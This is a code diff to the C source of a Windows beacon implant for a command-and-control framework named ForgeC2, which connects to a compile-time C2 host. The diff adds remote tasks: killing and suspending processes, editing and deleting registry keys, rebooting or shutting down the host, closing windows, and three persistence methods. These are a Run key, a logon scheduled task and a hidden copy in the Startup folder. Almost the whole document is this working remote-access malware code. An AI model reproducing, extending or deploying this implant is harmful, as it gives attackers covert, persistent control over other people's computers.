@@ -10,15 +10,18 @@
  *      AAD = uuid || 0x00 || seq_ascii. Inner body is PLAIN JSON (the server
  *      accepts unmarked JSON; no cbor/msgpack needed).
  *   5. tasks: shell/ps/ls/read/hostinfo/set_sleep/beacon_now/kill/
- *      download/upload (+ process_tree alias), with per-task enc
- *      decryption (AES-GCM, AAD uuid\\0taskID) and base64 results.
+ *      download/upload (+ process_tree alias), services/reg_get/reg_set/
+ *      reg_delete/killproc/suspend/resume/reboot/shutdown/persistence_add/
+ *      persistence_list/persistence_remove/window_list/window_close,
+ *      with per-task enc decryption (AES-GCM, AAD uuid\\0taskID) and
+ *      base64 results.
  *
  * Build (mingw-w64):
  *   x86_64-w64-mingw32-gcc -O2 -o cbeacon.exe beacon.c crypto_cng.c ^
  *     -lwinhttp -lbcrypt -D C2_HOST="..." -D C2_PORT=... ^
  *     -D SECRET_ID="..." -D SECRET_B64="..."
  *
- * This is a PROTOTYPE: HTTP only, no persistence, no evasion.
+ * This is a PROTOTYPE: HTTP only, no evasion.
  * Identity (UUID + X25519 key) persists in %TEMP%\\fc2c.dat.
  */
 #define _CRT_SECURE_NO_WARNINGS
@@ -911,6 +914,485 @@ static char *do_ps(DWORD *outlen) {
     buf[len] = '\0';
     if (outlen) *outlen = (DWORD)len;
     return buf;
+}
+
+/* ---------- system management (gh0st C_SYSTEM/C_SERVICE/C_REGEDIT parity) --- */
+
+static DWORD find_pid_by_name(const char *name) {
+    HANDLE snap;
+    PROCESSENTRY32 pe;
+    char with_exe[MAX_PATH];
+    DWORD pid = 0;
+    if (!name || !*name) return 0;
+    _snprintf(with_exe, sizeof(with_exe), "%s.exe", name);
+    snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (snap == INVALID_HANDLE_VALUE) return 0;
+    pe.dwSize = sizeof(pe);
+    if (Process32First(snap, &pe)) {
+        do {
+            if (_stricmp(pe.szExeFile, name) == 0 || _stricmp(pe.szExeFile, with_exe) == 0) {
+                pid = pe.th32ProcessID;
+                break;
+            }
+        } while (Process32Next(snap, &pe));
+    }
+    CloseHandle(snap);
+    return pid;
+}
+
+static int resolve_pid(const char *target, DWORD *pid_out) {
+    char *end = NULL;
+    unsigned long v;
+    if (!target || !*target || !pid_out) return -1;
+    v = strtoul(target, &end, 10);
+    if (end && *end == '\0' && v > 0 && v <= 0xFFFFFFFEu) {
+        *pid_out = (DWORD)v;
+        return 0;
+    }
+    *pid_out = find_pid_by_name(target);
+    return *pid_out ? 0 : -1;
+}
+
+static char *do_killproc(const char *target, DWORD *outlen) {
+    DWORD pid = 0;
+    HANDLE h;
+    char *out;
+    if (resolve_pid(target, &pid) != 0) return NULL;
+    h = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
+    if (!h) return NULL;
+    if (!TerminateProcess(h, 1)) { CloseHandle(h); return NULL; }
+    CloseHandle(h);
+    out = (char *)malloc(64);
+    if (!out) return NULL;
+    _snprintf(out, 64, "killed pid %lu", (unsigned long)pid);
+    if (outlen) *outlen = (DWORD)strlen(out);
+    return out;
+}
+
+static char *do_suspend_resume(const char *target, int suspend, DWORD *outlen) {
+    DWORD pid = 0;
+    HANDLE snap;
+    THREADENTRY32 te;
+    int count = 0;
+    char *out;
+    if (resolve_pid(target, &pid) != 0) return NULL;
+    snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+    if (snap == INVALID_HANDLE_VALUE) return NULL;
+    te.dwSize = sizeof(te);
+    if (Thread32First(snap, &te)) {
+        do {
+            HANDLE th;
+            if (te.th32OwnerProcessID != pid) continue;
+            th = OpenThread(THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID);
+            if (!th) continue;
+            if (suspend) { if (SuspendThread(th) != (DWORD)-1) count++; }
+            else { if (ResumeThread(th) != (DWORD)-1) count++; }
+            CloseHandle(th);
+        } while (Thread32Next(snap, &te));
+    }
+    CloseHandle(snap);
+    if (count == 0) return NULL;
+    out = (char *)malloc(96);
+    if (!out) return NULL;
+    _snprintf(out, 96, "%s %d threads (pid=%lu)",
+        suspend ? "suspended" : "resumed", count, (unsigned long)pid);
+    if (outlen) *outlen = (DWORD)strlen(out);
+    return out;
+}
+
+static char *do_services(DWORD *outlen) {
+    char *out = exec_shell_full(
+        "Get-Service | Select-Object -Property Name, DisplayName, Status, StartType | Sort-Object -Property Status, Name | Format-Table -AutoSize | Out-String",
+        "powershell", outlen);
+    if (out && *out) return out;
+    if (out) free(out);
+    return exec_shell_full("sc query state= all", NULL, outlen);
+}
+
+static HKEY reg_hive(const char *path, const char **sub_out) {
+    if (!path || !sub_out) return NULL;
+    if (_strnicmp(path, "HKLM\\", 5) == 0) { *sub_out = path + 5; return HKEY_LOCAL_MACHINE; }
+    if (_strnicmp(path, "HKCU\\", 5) == 0) { *sub_out = path + 5; return HKEY_CURRENT_USER; }
+    if (_strnicmp(path, "HKCR\\", 5) == 0) { *sub_out = path + 5; return HKEY_CLASSES_ROOT; }
+    if (_strnicmp(path, "HKU\\", 4) == 0) { *sub_out = path + 4; return HKEY_USERS; }
+    if (_strnicmp(path, "HKCC\\", 5) == 0) { *sub_out = path + 5; return HKEY_CURRENT_CONFIG; }
+    return NULL;
+}
+
+static char *do_reg_get(const char *key, DWORD *outlen) {
+    char cmd[2048];
+    char *out;
+    if (!key || !*key) return NULL;
+    _snprintf(cmd, sizeof(cmd), "reg query \"%s\" /s", key);
+    out = exec_shell_full(cmd, NULL, outlen);
+    if (!out) return NULL;
+    if (_strnicmp(out, "ERROR", 5) == 0) { free(out); return NULL; }
+    return out;
+}
+
+/* Mirror Go regSetWindows: Data is "TYPE|value", written to the key's
+ * default value (/ve). Returns 0 ok, -1 failure, -2 bad format. */
+static int do_reg_set_native(const char *path, const char *data) {
+    HKEY hive;
+    const char *sub = NULL;
+    const char *sep;
+    char typebuf[32];
+    const char *val;
+    DWORD type = REG_SZ;
+    HKEY hk = NULL;
+    LONG rc;
+    if (!path || !*path || !data) return -2;
+    hive = reg_hive(path, &sub);
+    if (!hive || !sub || !*sub) return -2;
+    sep = strchr(data, '|');
+    if (!sep) return -2;
+    if ((size_t)(sep - data) >= sizeof(typebuf)) return -2;
+    memcpy(typebuf, data, (size_t)(sep - data));
+    typebuf[sep - data] = '\0';
+    val = sep + 1;
+    if (_stricmp(typebuf, "REG_SZ") == 0) type = REG_SZ;
+    else if (_stricmp(typebuf, "REG_EXPAND_SZ") == 0) type = REG_EXPAND_SZ;
+    else if (_stricmp(typebuf, "REG_DWORD") == 0) type = REG_DWORD;
+    else if (_stricmp(typebuf, "REG_QWORD") == 0) type = REG_QWORD;
+    else if (_stricmp(typebuf, "REG_BINARY") == 0) type = REG_BINARY;
+    else if (_stricmp(typebuf, "REG_MULTI_SZ") == 0) type = REG_MULTI_SZ;
+    else return -2;
+    rc = RegCreateKeyExA(hive, sub, 0, NULL, 0, KEY_SET_VALUE, NULL, &hk, NULL);
+    if (rc != ERROR_SUCCESS) return -1;
+    if (type == REG_DWORD) {
+        DWORD v = (DWORD)strtoul(val, NULL, 0);
+        rc = RegSetValueExA(hk, NULL, 0, type, (const BYTE *)&v, sizeof(v));
+    } else if (type == REG_QWORD) {
+        unsigned long long v = _strtoui64(val, NULL, 0);
+        rc = RegSetValueExA(hk, NULL, 0, type, (const BYTE *)&v, sizeof(v));
+    } else if (type == REG_BINARY) {
+        size_t n = strlen(val) / 2, i;
+        BYTE *b = (BYTE *)malloc(n ? n : 1);
+        if (!b) { RegCloseKey(hk); return -1; }
+        for (i = 0; i < n; i++) {
+            unsigned int byte = 0;
+            sscanf_s(val + i * 2, "%2x", &byte);
+            b[i] = (BYTE)byte;
+        }
+        rc = RegSetValueExA(hk, NULL, 0, type, b, (DWORD)n);
+        cng_wipe(b, n);
+        free(b);
+    } else if (type == REG_MULTI_SZ) {
+        size_t n = strlen(val) + 2;
+        char *m = (char *)malloc(n);
+        if (!m) { RegCloseKey(hk); return -1; }
+        memcpy(m, val, strlen(val) + 1);
+        m[strlen(val) + 1] = '\0';
+        rc = RegSetValueExA(hk, NULL, 0, type, (const BYTE *)m, (DWORD)n);
+        cng_wipe((BYTE *)m, (DWORD)n);
+        free(m);
+    } else {
+        rc = RegSetValueExA(hk, NULL, 0, type, (const BYTE *)val, (DWORD)(strlen(val) + 1));
+    }
+    RegCloseKey(hk);
+    return rc == ERROR_SUCCESS ? 0 : -1;
+}
+
+static int do_reg_delete_native(const char *key) {
+    HKEY hive;
+    const char *sub = NULL;
+    LONG rc;
+    if (!key || !*key) return -1;
+    hive = reg_hive(key, &sub);
+    if (!hive || !sub || !*sub) return -1;
+    rc = RegDeleteTreeA(hive, sub);
+    return rc == ERROR_SUCCESS ? 0 : -1;
+}
+
+/* C-implant persistence names mirror the Go default persistencePrefix. */
+#define CPERSIST_RUN_VALUE "ForgeC2"
+#define CPERSIST_TASK_NAME "ForgeC2Update"
+#define CPERSIST_STARTUP_FILE "ForgeC2.exe"
+
+static int self_exe_path(char *out, DWORD cap) {
+    DWORD n;
+    if (!out || cap == 0) return -1;
+    n = GetModuleFileNameA(NULL, out, cap);
+    return (n > 0 && n < cap) ? 0 : -1;
+}
+
+static void startup_file_path(char *out, DWORD cap) {
+    char appdata[MAX_PATH] = {0};
+    DWORD n = GetEnvironmentVariableA("APPDATA", appdata, sizeof(appdata));
+    if (n == 0 || n >= sizeof(appdata)) {
+        n = GetEnvironmentVariableA("LOCALAPPDATA", appdata, sizeof(appdata));
+        if (n == 0 || n >= sizeof(appdata)) { out[0] = '\0'; return; }
+    }
+    _snprintf(out, cap, "%s\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\%s",
+        appdata, CPERSIST_STARTUP_FILE);
+}
+
+/* Always returns malloc'd status text (Go applyPersistence parity); NULL only on OOM. */
+static char *do_persist_add(const char *method, const char *args) {
+    char binary[MAX_PATH] = {0};
+    char msg[2048];
+    if (!method || !*method) {
+        _snprintf(msg, sizeof(msg), "unknown persistence method: %s", method ? method : "");
+        return _strdup(msg);
+    }
+    if (args && *args) {
+        _snprintf(binary, sizeof(binary), "%s", args);
+    } else if (self_exe_path(binary, sizeof(binary)) != 0) {
+        _snprintf(msg, sizeof(msg), "%s: failed to resolve binary path", method);
+        return _strdup(msg);
+    }
+    if (strcmp(method, "registry") == 0) {
+        HKEY hk = NULL;
+        LONG rc = RegCreateKeyExA(HKEY_CURRENT_USER,
+            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+            0, NULL, 0, KEY_SET_VALUE, NULL, &hk, NULL);
+        if (rc == ERROR_SUCCESS)
+            rc = RegSetValueExA(hk, CPERSIST_RUN_VALUE, 0, REG_SZ,
+                (const BYTE *)binary, (DWORD)(strlen(binary) + 1));
+        if (hk) RegCloseKey(hk);
+        if (rc == ERROR_SUCCESS)
+            _snprintf(msg, sizeof(msg), "registry: persistence added via HKCU Run key -> %s", binary);
+        else
+            _snprintf(msg, sizeof(msg), "registry: failed (%lu)", (unsigned long)rc);
+        return _strdup(msg);
+    }
+    if (strcmp(method, "scheduled_task") == 0) {
+        char cmd[2048];
+        DWORD olen = 0;
+        char *out;
+        _snprintf(cmd, sizeof(cmd), "schtasks /create /tn %s /tr \"%s\" /sc onlogon /f",
+            CPERSIST_TASK_NAME, binary);
+        out = exec_shell_full(cmd, NULL, &olen);
+        if (out && (strstr(out, "SUCCESS") || strstr(out, "success"))) {
+            _snprintf(msg, sizeof(msg), "scheduled_task: created task '%s' -> %s", CPERSIST_TASK_NAME, binary);
+        } else {
+            _snprintf(msg, sizeof(msg), "scheduled_task: failed%s%s",
+                out && *out ? ": " : "", out && *out ? out : "");
+        }
+        if (out) free(out);
+        return _strdup(msg);
+    }
+    if (strcmp(method, "startup_folder") == 0) {
+        char dst[MAX_PATH] = {0};
+        startup_file_path(dst, sizeof(dst));
+        if (!dst[0]) {
+            _snprintf(msg, sizeof(msg), "startup_folder: failed to resolve startup dir");
+            return _strdup(msg);
+        }
+        if (CopyFileA(binary, dst, FALSE)) {
+            SetFileAttributesA(dst, FILE_ATTRIBUTE_HIDDEN);
+            _snprintf(msg, sizeof(msg), "startup_folder: copied to %s", dst);
+        } else {
+            _snprintf(msg, sizeof(msg), "startup_folder: copy failed (%lu)", (unsigned long)GetLastError());
+        }
+        return _strdup(msg);
+    }
+    _snprintf(msg, sizeof(msg), "unknown persistence method: %s", method);
+    return _strdup(msg);
+}
+
+static char *do_persist_list(void) {
+    char *buf = (char *)malloc(8192);
+    size_t len = 0;
+    HKEY hk = NULL;
+    char dst[MAX_PATH] = {0};
+    DWORD olen = 0;
+    char *out;
+    if (!buf) return NULL;
+    buf[0] = '\0';
+    if (RegOpenKeyExA(HKEY_CURRENT_USER,
+            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+            0, KEY_QUERY_VALUE, &hk) == ERROR_SUCCESS) {
+        DWORD n = 0;
+        LONG rc = RegQueryValueExA(hk, CPERSIST_RUN_VALUE, NULL, NULL, NULL, &n);
+        RegCloseKey(hk);
+        len += (size_t)_snprintf(buf + len, 8192 - len, "%s Registry Run key (%s): %s\n",
+            rc == ERROR_SUCCESS ? "[+]" : "[-]", CPERSIST_RUN_VALUE,
+            rc == ERROR_SUCCESS ? "found" : "not found");
+    } else {
+        len += (size_t)_snprintf(buf + len, 8192 - len, "[-] Registry Run key (%s): not found\n",
+            CPERSIST_RUN_VALUE);
+    }
+    out = exec_shell_full("schtasks /query /tn " CPERSIST_TASK_NAME " /fo LIST", NULL, &olen);
+    len += (size_t)_snprintf(buf + len, 8192 - len, "%s Scheduled task (%s): %s\n",
+        (out && !strstr(out, "ERROR")) ? "[+]" : "[-]", CPERSIST_TASK_NAME,
+        (out && !strstr(out, "ERROR")) ? "found" : "not found");
+    if (out) free(out);
+    startup_file_path(dst, sizeof(dst));
+    len += (size_t)_snprintf(buf + len, 8192 - len, "%s Startup folder: %s %s\n",
+        (dst[0] && GetFileAttributesA(dst) != INVALID_FILE_ATTRIBUTES) ? "[+]" : "[-]",
+        CPERSIST_STARTUP_FILE,
+        (dst[0] && GetFileAttributesA(dst) != INVALID_FILE_ATTRIBUTES) ? "present" : "not found");
+    (void)len;
+    return buf;
+}
+
+static char *do_persist_remove(const char *method) {
+    char msg[1024];
+    if (!method || !*method) {
+        _snprintf(msg, sizeof(msg), "unknown persistence method: %s", method ? method : "");
+        return _strdup(msg);
+    }
+    if (strcmp(method, "registry") == 0) {
+        HKEY hk = NULL;
+        LONG rc = RegOpenKeyExA(HKEY_CURRENT_USER,
+            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+            0, KEY_SET_VALUE, &hk);
+        if (rc == ERROR_SUCCESS) {
+            rc = RegDeleteValueA(hk, CPERSIST_RUN_VALUE);
+            RegCloseKey(hk);
+        }
+        _snprintf(msg, sizeof(msg), rc == ERROR_SUCCESS ?
+            "registry: removed Run key" : "registry remove: failed (no Run key entry found)");
+        return _strdup(msg);
+    }
+    if (strcmp(method, "scheduled_task") == 0) {
+        DWORD olen = 0;
+        char cmd[256];
+        char *out;
+        _snprintf(cmd, sizeof(cmd), "schtasks /delete /tn %s /f", CPERSIST_TASK_NAME);
+        out = exec_shell_full(cmd, NULL, &olen);
+        _snprintf(msg, sizeof(msg), (out && (strstr(out, "SUCCESS") || strstr(out, "success"))) ?
+            "scheduled_task: removed task" : "scheduled_task remove: failed (no task found)");
+        if (out) free(out);
+        return _strdup(msg);
+    }
+    if (strcmp(method, "startup_folder") == 0) {
+        char dst[MAX_PATH] = {0};
+        startup_file_path(dst, sizeof(dst));
+        if (dst[0] && DeleteFileA(dst)) {
+            _snprintf(msg, sizeof(msg), "startup_folder: removed startup file");
+        } else {
+            _snprintf(msg, sizeof(msg), "startup_folder remove: failed (no startup file found)");
+        }
+        return _strdup(msg);
+    }
+    _snprintf(msg, sizeof(msg), "unknown persistence method: %s", method);
+    return _strdup(msg);
+}
+
+static const char *stristr_c(const char *hay, const char *needle) {
+    size_t nl;
+    if (!hay || !needle || !*needle) return NULL;
+    nl = strlen(needle);
+    for (; *hay; hay++) {
+        if (_strnicmp(hay, needle, nl) == 0) return hay;
+    }
+    return NULL;
+}
+
+typedef struct {
+    char *buf;
+    size_t len;
+    size_t cap;
+    int count;
+} wincollect_t;
+
+static BOOL CALLBACK win_enum_cb(HWND hwnd, LPARAM lp) {
+    wincollect_t *wc = (wincollect_t *)lp;
+    WCHAR wtitle[512];
+    char title[1024];
+    DWORD pid = 0;
+    int n, m;
+    char line[1408];
+    if (!IsWindowVisible(hwnd)) return TRUE;
+    if (GetWindowTextLengthW(hwnd) == 0) return TRUE;
+    memset(wtitle, 0, sizeof(wtitle));
+    GetWindowTextW(hwnd, wtitle, (int)(sizeof(wtitle) / sizeof(wtitle[0])));
+    m = WideCharToMultiByte(CP_UTF8, 0, wtitle, -1, title, (int)sizeof(title) - 1, NULL, NULL);
+    if (m <= 0) return TRUE;
+    title[sizeof(title) - 1] = '\0';
+    GetWindowThreadProcessId(hwnd, &pid);
+    n = _snprintf(line, sizeof(line), "%llu\t%lu\t%s\n",
+        (unsigned long long)(uintptr_t)hwnd, (unsigned long)pid, title);
+    if (wc->len + (size_t)n + 1 > wc->cap) {
+        size_t ncap = wc->cap * 2;
+        char *nb;
+        if (ncap > OUT_CAP) return FALSE;
+        nb = (char *)realloc(wc->buf, ncap);
+        if (!nb) return FALSE;
+        wc->buf = nb;
+        wc->cap = ncap;
+    }
+    memcpy(wc->buf + wc->len, line, (size_t)n);
+    wc->len += (size_t)n;
+    wc->count++;
+    if (wc->count >= 500) return FALSE;
+    return TRUE;
+}
+
+static char *do_window_list(DWORD *outlen) {
+    wincollect_t wc;
+    const char *hdr = "HWND\tPID\tTITLE\n";
+    char foot[64];
+    wc.cap = 65536;
+    wc.len = 0;
+    wc.count = 0;
+    wc.buf = (char *)malloc(wc.cap);
+    if (!wc.buf) return NULL;
+    memcpy(wc.buf, hdr, strlen(hdr));
+    wc.len = strlen(hdr);
+    EnumWindows(win_enum_cb, (LPARAM)&wc);
+    _snprintf(foot, sizeof(foot), "# windows=%d\n", wc.count);
+    if (wc.len + strlen(foot) + 1 <= wc.cap) {
+        memcpy(wc.buf + wc.len, foot, strlen(foot));
+        wc.len += strlen(foot);
+    }
+    wc.buf[wc.len] = '\0';
+    if (outlen) *outlen = (DWORD)wc.len;
+    return wc.buf;
+}
+
+static char *do_window_close(const char *target, DWORD *outlen) {
+    char *end = NULL;
+    unsigned long long v;
+    char msg[1024];
+    HWND hwnd = NULL;
+    char tbuf[512];
+    if (!target || !*target) return NULL;
+    v = _strtoui64(target, &end, 10);
+    if (end && *end == '\0' && v != 0) {
+        hwnd = (HWND)(uintptr_t)v;
+        if (!IsWindow(hwnd)) return NULL;
+    } else {
+        wincollect_t wc;
+        _snprintf(tbuf, sizeof(tbuf), "%s", target);
+        wc.cap = 65536;
+        wc.len = 0;
+        wc.count = 0;
+        wc.buf = (char *)malloc(wc.cap);
+        if (!wc.buf) return NULL;
+        wc.buf[0] = '\0';
+        EnumWindows(win_enum_cb, (LPARAM)&wc);
+        /* Re-scan collected lines for the first title match. */
+        {
+            char *line = wc.buf;
+            char *hit = NULL;
+            while (line && *line) {
+                char *nl = strchr(line, '\n');
+                if (nl) *nl = '\0';
+                if (strstr(line, "HWND") != line) {
+                    char *tab1 = strchr(line, '\t');
+                    char *tab2 = tab1 ? strchr(tab1 + 1, '\t') : NULL;
+                    if (tab2 && stristr_c(tab2 + 1, tbuf)) { hit = line; break; }
+                }
+                line = nl ? nl + 1 : NULL;
+            }
+            if (hit) {
+                hwnd = (HWND)(uintptr_t)_strtoui64(hit, NULL, 10);
+            }
+        }
+        free(wc.buf);
+        if (!hwnd || !IsWindow(hwnd)) return NULL;
+    }
+    if (!PostMessageW(hwnd, WM_CLOSE, 0, 0)) return NULL;
+    _snprintf(msg, sizeof(msg), "window_close: WM_CLOSE posted to HWND %llu",
+        (unsigned long long)(uintptr_t)hwnd);
+    {
+        char *out = _strdup(msg);
+        if (outlen && out) *outlen = (DWORD)strlen(out);
+        return out;
+    }
 }
 
 static char *do_ls(const char *path, DWORD *outlen) {
@@ -2182,7 +2664,139 @@ int main(void) {
             }
         }
     }
-} else {
+} else if (strcmp(t.type, "services") == 0) {
+                                                DWORD olen = 0;
+                                                char *out = do_services(&olen);
+                                                if (out && *out) {
+                                                    char *b64 = b64enc((const BYTE *)out, olen);
+                                                    robj = b64 ? emit_b64_result(t.id, "services", b64, rid) : NULL;
+                                                    free(b64);
+                                                    free(out);
+                                                } else {
+                                                    if (out) free(out);
+                                                    robj = emit_error_result(t.id, "services", "services failed", rid);
+                                                }
+                                            } else if (strcmp(t.type, "reg_get") == 0) {
+                                                const char *kk = (t.command && t.command[0]) ? t.command : t.path;
+                                                DWORD olen = 0;
+                                                char *out = do_reg_get(kk, &olen);
+                                                if (out) {
+                                                    char *b64 = b64enc((const BYTE *)out, olen);
+                                                    robj = b64 ? emit_b64_result(t.id, "reg_get", b64, rid) : NULL;
+                                                    free(b64);
+                                                    free(out);
+                                                }
+                                                if (!robj) robj = emit_error_result(t.id, "reg_get", "reg query failed", rid);
+                                            } else if (strcmp(t.type, "reg_set") == 0) {
+                                                const char *pp = (t.path && t.path[0]) ? t.path : t.command;
+                                                const char *dd = (t.data && t.data[0]) ? t.data : t.shell;
+                                                int rc;
+                                                if (!pp || !*pp || !dd || !*dd) {
+                                                    robj = emit_error_result(t.id, "reg_set", "reg_set: path (command) and data required", rid);
+                                                } else if ((rc = do_reg_set_native(pp, dd)) == 0) {
+                                                    robj = emit_text_result(t.id, "reg_set", "reg set", rid);
+                                                } else if (rc == -2) {
+                                                    robj = emit_error_result(t.id, "reg_set", "data format: TYPE|value e.g. REG_SZ|hello", rid);
+                                                } else {
+                                                    robj = emit_error_result(t.id, "reg_set", "reg set failed", rid);
+                                                }
+                                            } else if (strcmp(t.type, "reg_delete") == 0) {
+                                                const char *kk = (t.command && t.command[0]) ? t.command : t.path;
+                                                if (!kk || !*kk) {
+                                                    robj = emit_error_result(t.id, "reg_delete", "reg_delete: key path required", rid);
+                                                } else if (do_reg_delete_native(kk) == 0) {
+                                                    robj = emit_text_result(t.id, "reg_delete", "reg deleted", rid);
+                                                } else {
+                                                    robj = emit_error_result(t.id, "reg_delete", "reg delete failed", rid);
+                                                }
+                                            } else if (strcmp(t.type, "killproc") == 0) {
+                                                const char *tt = (t.command && t.command[0]) ? t.command : t.path;
+                                                DWORD olen = 0;
+                                                char *out = do_killproc(tt, &olen);
+                                                if (out) {
+                                                    robj = emit_text_result(t.id, "killproc", out, rid);
+                                                    free(out);
+                                                }
+                                                if (!robj) robj = emit_error_result(t.id, "killproc", "kill failed", rid);
+                                            } else if (strcmp(t.type, "suspend") == 0 || strcmp(t.type, "resume") == 0) {
+                                                int is_susp = strcmp(t.type, "suspend") == 0;
+                                                const char *tt = (t.command && t.command[0]) ? t.command : t.path;
+                                                DWORD olen = 0;
+                                                char *out = do_suspend_resume(tt, is_susp, &olen);
+                                                if (out) {
+                                                    robj = emit_text_result(t.id, t.type, out, rid);
+                                                    free(out);
+                                                }
+                                                if (!robj) robj = emit_error_result(t.id, t.type, is_susp ? "suspend failed" : "resume failed", rid);
+                                            } else if (strcmp(t.type, "reboot") == 0 || strcmp(t.type, "shutdown") == 0) {
+                                                int is_reboot = strcmp(t.type, "reboot") == 0;
+                                                DWORD olen = 0;
+                                                char *out = exec_shell_full(is_reboot ? "shutdown /r /t 0" : "shutdown /s /t 0", NULL, &olen);
+                                                char msg[128];
+                                                if (out) free(out);
+                                                _snprintf(msg, sizeof(msg), is_reboot ? "reboot initiated" : "shutdown initiated");
+                                                robj = emit_text_result(t.id, t.type, msg, rid);
+                                            } else if (strcmp(t.type, "persistence_add") == 0) {
+                                                const char *cc = t.command ? t.command : "";
+                                                const char *bar = strchr(cc, '|');
+                                                char method[64] = {0};
+                                                const char *args = "";
+                                                char *out;
+                                                if (bar) {
+                                                    size_t ml = (size_t)(bar - cc);
+                                                    if (ml >= sizeof(method)) ml = sizeof(method) - 1;
+                                                    memcpy(method, cc, ml);
+                                                    method[ml] = '\0';
+                                                    args = bar + 1;
+                                                } else {
+                                                    _snprintf(method, sizeof(method), "%s", cc);
+                                                }
+                                                out = do_persist_add(method, args);
+                                                robj = out ? emit_text_result(t.id, "persistence_add", out, rid) : NULL;
+                                                if (out) free(out);
+                                                if (!robj) robj = emit_error_result(t.id, "persistence_add", "persistence_add failed", rid);
+                                            } else if (strcmp(t.type, "persistence_list") == 0) {
+                                                char *out = do_persist_list();
+                                                robj = out ? emit_text_result(t.id, "persistence_list", out, rid) : NULL;
+                                                if (out) free(out);
+                                                if (!robj) robj = emit_error_result(t.id, "persistence_list", "persistence_list failed", rid);
+                                            } else if (strcmp(t.type, "persistence_remove") == 0) {
+                                                const char *cc = t.command ? t.command : "";
+                                                const char *bar = strchr(cc, '|');
+                                                char method[64] = {0};
+                                                char *out;
+                                                if (bar) {
+                                                    size_t ml = (size_t)(bar - cc);
+                                                    if (ml >= sizeof(method)) ml = sizeof(method) - 1;
+                                                    memcpy(method, cc, ml);
+                                                    method[ml] = '\0';
+                                                } else {
+                                                    _snprintf(method, sizeof(method), "%s", cc);
+                                                }
+                                                out = do_persist_remove(method);
+                                                robj = out ? emit_text_result(t.id, "persistence_remove", out, rid) : NULL;
+                                                if (out) free(out);
+                                                if (!robj) robj = emit_error_result(t.id, "persistence_remove", "persistence_remove failed", rid);
+                                            } else if (strcmp(t.type, "window_list") == 0) {
+                                                DWORD olen = 0;
+                                                char *out = do_window_list(&olen);
+                                                if (out) {
+                                                    char *b64 = b64enc((const BYTE *)out, olen);
+                                                    robj = b64 ? emit_b64_result(t.id, "window_list", b64, rid) : NULL;
+                                                    free(b64);
+                                                    free(out);
+                                                }
+                                                if (!robj) robj = emit_error_result(t.id, "window_list", "window_list failed", rid);
+                                            } else if (strcmp(t.type, "window_close") == 0) {
+                                                const char *tt = (t.command && t.command[0]) ? t.command : t.path;
+                                                DWORD olen = 0;
+                                                char *out = do_window_close(tt, &olen);
+                                                if (out) {
+                                                    robj = emit_text_result(t.id, "window_close", out, rid);
+                                                    free(out);
+                                                }
+                                                if (!robj) robj = emit_error_result(t.id, "window_close", "window_close failed", rid);
+                                            } else {
                                                 char msg[128];
                                                 _snprintf(msg, sizeof(msg), "unsupported in C implant: %s", t.type);
                                                 robj = emit_error_result(t.id, t.type, msg, rid);
